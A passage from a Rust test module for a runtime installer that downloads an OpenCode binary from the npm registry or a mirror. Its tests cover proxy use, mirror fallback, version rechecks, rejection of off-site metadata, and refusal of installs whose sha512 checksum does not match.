            (url.clone(), Ok(archive_bytes)),
        ]);
        let fetch_state = Arc::new(MockFetch {
            calls: Mutex::new(Vec::new()),
            responses,
            default: Err("Should not contact npm".to_string()),
            proxied: Mutex::new(Vec::new()),
        });
        let options = RuntimeOptions {
            probe: Some(synthetic_probe()),
            candidates: Some(vec![stale]),
            fetch: Some(mock_options(fetch_state.clone())),
            ..Default::default()
        };
        let file = find(&join_host(&[&root, "install"]), options).await.unwrap();
        assert_eq!(file, join_host(&[&root, "install", "runtime", "1.18.33", &pkg.binary]));
        assert_eq!(*fetch_state.calls.lock().unwrap(), vec![latest_url, url]);
        assert_eq!(fs::read_to_string(&file).unwrap().trim(), "1.18.33");
        let provenance = join_host(&[&parent_dir(&file), "provenance.json"]);
        assert!(fs::read_to_string(&provenance).unwrap().contains("\"managed\": true"));
        let _ = fs::remove_dir_all(&root);
    }

    #[tokio::test]
    async fn download_uses_proxy_and_falls_back_to_the_mirror() {
        let root = temp_dir("mirror");
        let pkg = runtime_package(host_platform(), host_arch()).unwrap();
        let archive_bytes = make_archive(&pkg.binary, "1.18.33\n");
        let integrity = sha512_integrity(&archive_bytes.clone());
        let mirror = format!("https://registry.npmmirror.com/{}", pkg.name);
        let tarball = format!("{}/-/{}-1.18.33.tgz", mirror, pkg.name);
        let mirror_latest = format!("{mirror}/latest");
        let official_latest = format!("https://registry.npmjs.org/{}/latest", pkg.name);
        let responses = HashMap::from([
            (mirror_latest.clone(), Ok(metadata_json(&pkg, "1.18.33", &tarball, &integrity))),
            (tarball.clone(), Ok(archive_bytes)),
        ]);
        let fetch_state = Arc::new(MockFetch {
            calls: Mutex::new(Vec::new()),
            responses,
            default: Err("timed out".to_string()),
            proxied: Mutex::new(Vec::new()),
        });
        let log: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
        let log_sink = log.clone();
        let options = RuntimeOptions {
            probe: Some(synthetic_probe()),
            candidates: Some(vec![]),
            fetch: Some(mock_options(fetch_state.clone())),
            log: Some(Arc::new(move |message: &str| log_sink.lock().unwrap().push(message.to_string()))),
            proxy_env: env_of(&[("HTTPS_PROXY", "http://127.0.0.1:7890")]),
            ..Default::default()
        };
        let file = find(&join_host(&[&root, "install"]), options).await.unwrap();
        assert_eq!(file, join_host(&[&root, "install", "runtime", "1.18.33", &pkg.binary]));
        assert!(fetch_state.proxied.lock().unwrap().iter().all(|value| *value));
        assert_eq!(
            *fetch_state.calls.lock().unwrap(),
            vec![official_latest, mirror_latest, tarball]
        );
        let joined = log.lock().unwrap().join("\n");
        assert!(joined.contains("npmmirror"), "got {joined}");
        let _ = fs::remove_dir_all(&root);
    }

    #[tokio::test]
    async fn rejected_candidates_are_reported_not_silently_ignored() {
        let root = temp_dir("rejected");
        let pkg = runtime_package(host_platform(), host_arch()).unwrap();
        let shim = join_host(&[&root, "source", "opencode.cmd"]);
        write_binary(&shim, "1.25.7");
        let broken = join_host(&[&root, "source", "broken", &pkg.binary]);
        write_binary(&broken, "not-a-version");
        let log: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
        let log_sink = log.clone();
        let options = RuntimeOptions {
            probe: Some(synthetic_probe()),
            candidates: Some(vec![shim, broken]),
            fetch: Some(Arc::new(|_, _| Box::pin(async { Err("npm unreachable".to_string()) }))),
            log: Some(Arc::new(move |message: &str| log_sink.lock().unwrap().push(message.to_string()))),
            ..Default::default()
        };
        let error = find(&root, options).await.unwrap_err();
        assert!(error.contains("npm unreachable"));
        let joined = log.lock().unwrap().join("\n");
        assert!(joined.contains("launcher script"), "got {joined}");
        assert!(joined.contains("unrecognized version output"), "got {joined}");
        let _ = fs::remove_dir_all(&root);
    }

    #[tokio::test]
    async fn first_install_rechecks_the_downloaded_executable_version() {
        let root = temp_dir("mismatch");
        let pkg = runtime_package(host_platform(), host_arch()).unwrap();
        // 包内二进制自称 1.25.8，但元数据声明 1.25.7 → 回读必须失败。
        let archive_bytes = make_archive(&pkg.binary, "1.25.8\n");
        let integrity = sha512_integrity(&archive_bytes.clone());
        let url = format!("https://registry.npmjs.org/{}/-/{}-1.25.7.tgz", pkg.name, pkg.name);
        let latest_url = format!("https://registry.npmjs.org/{}/latest", pkg.name);
        let responses = HashMap::from([
            (latest_url, Ok(metadata_json(&pkg, "1.25.7", &url, &integrity))),
            (url, Ok(archive_bytes)),
        ]);
        let fetch_state = Arc::new(MockFetch {
            calls: Mutex::new(Vec::new()),
            responses,
            default: Err("nope".to_string()),
            proxied: Mutex::new(Vec::new()),
        });
        let options = RuntimeOptions {
            probe: Some(synthetic_probe()),
            candidates: Some(vec![]),
            fetch: Some(mock_options(fetch_state.clone())),
            ..Default::default()
        };
        let error = find(&join_host(&[&root, "mismatch"]), options).await.unwrap_err();
        assert!(error.contains("Downloaded OpenCode version mismatch"), "got {error}");
        let _ = fs::remove_dir_all(&root);
    }

    #[tokio::test]
    async fn rejects_unofficial_metadata_and_checksum_mismatches() {
        let root = temp_dir("untrusted");
        let pkg = runtime_package(host_platform(), host_arch()).unwrap();
        // 元数据可信校验失败（tarball 来自站外）。
        let bad_metadata = json!({ "name": pkg.name, "version": "1.25.7",
            "dist": { "integrity": "sha512-invalid", "tarball": "https://example.com/runtime.tgz" } })
        .to_string()
        .into_bytes();
        let latest_url = format!("https://registry.npmjs.org/{}/latest", pkg.name);
        let mirror_latest = format!("https://registry.npmmirror.com/{}/latest", pkg.name);
        let responses = HashMap::from([
            (latest_url, Ok(bad_metadata.clone())),
            (mirror_latest, Ok(bad_metadata)),
        ]);
        let options = RuntimeOptions {
            probe: Some(synthetic_probe()),
            candidates: Some(vec![]),
            fetch: Some(mock_options(
                Arc::new(MockFetch {
                    calls: Mutex::new(Vec::new()),
                    responses,
                    default: Err("nope".to_string()),
                    proxied: Mutex::new(Vec::new()),
                }),
            )),
            ..Default::default()
        };
        let error = find(&root, options).await.unwrap_err();
        assert!(error.contains("安装信息不可信"), "got {error}");

        // 字节与 sha512 不符：绝不安装，也不留下半成品。
        let url = format!("https://registry.npmjs.org/{}/-/{}-1.25.7.tgz", pkg.name, pkg.name);
        let wrong = format!("https://registry.npmmirror.com/{}/-/{}-1.25.7.tgz", pkg.name, pkg.name);
        let responses = HashMap::from([
            (
                format!("https://registry.npmjs.org/{}/latest", pkg.name),
                Ok(metadata_json(&pkg, "1.25.7", &url, "sha512-does-not-match")),
            ),
            (url, Ok(b"wrong bytes".to_vec())),
            (wrong.clone(), Ok(b"wrong bytes".to_vec())),
        ]);
        let options = RuntimeOptions {
            probe: Some(synthetic_probe()),
            candidates: Some(vec![]),
            fetch: Some(mock_options(
                Arc::new(MockFetch {
                    calls: Mutex::new(Vec::new()),
                    responses,
                    default: Err("nope".to_string()),
                    proxied: Mutex::new(Vec::new()),
                }),
            )),
            ..Default::default()
        };
        let error = find(&root, options).await.unwrap_err();
        assert!(error.contains("OpenCode download checksum mismatch"), "got {error}");
        let installed = join_host(&[&root, "runtime", "1.25.7", &pkg.binary]);
        assert!(!Path::new(&installed).exists());
        let _ = fs::remove_dir_all(&root);
    }

    #[tokio::test]
    async fn tarball_fallback_rejects_different_mirror_bytes() {
        let root = temp_dir("corrupt");
        let pkg = runtime_package(host_platform(), host_arch()).unwrap();
        let good = make_archive(&pkg.binary, "1.18.33\n");
        let integrity = sha512_integrity(&good.clone());
        let official = format!("https://registry.npmjs.org/{}/-/{}-1.18.33.tgz", pkg.name, pkg.name);
        let mirror = official.replace("registry.npmjs.org", "registry.npmmirror.com");
        let latest_url = format!("https://registry.npmjs.org/{}/latest", pkg.name);
        let mut responses = HashMap::new();
        responses.insert(latest_url.clone(), Ok(metadata_json(&pkg, "1.18.33", &official, &integrity)));
        responses.insert(official.clone(), Err("connection reset".to_string()));
        responses.insert(mirror.clone(), Ok(b"invalid archive".to_vec()));
        let fetch_state = Arc::new(MockFetch {
            calls: Mutex::new(Vec::new()),
            responses,
            default: Err("nope".to_string()),
            proxied: Mutex::new(Vec::new()),
        });
        let install = join_host(&[&root, "corrupt"]);
        let options = RuntimeOptions {
            probe: Some(synthetic_probe()),
            candidates: Some(vec![]),
            fetch: Some(mock_options(fetch_state.clone())),
            ..Default::default()
        };
        let error = find(&install, options).await.unwrap_err();
        assert!(error.contains("OpenCode download checksum mismatch"), "got {error}");
        assert_eq!(
            *fetch_state.calls.lock().unwrap(),
            vec![latest_url, official, mirror]
        );
        let _ = fs::remove_dir_all(&root);
    }
}
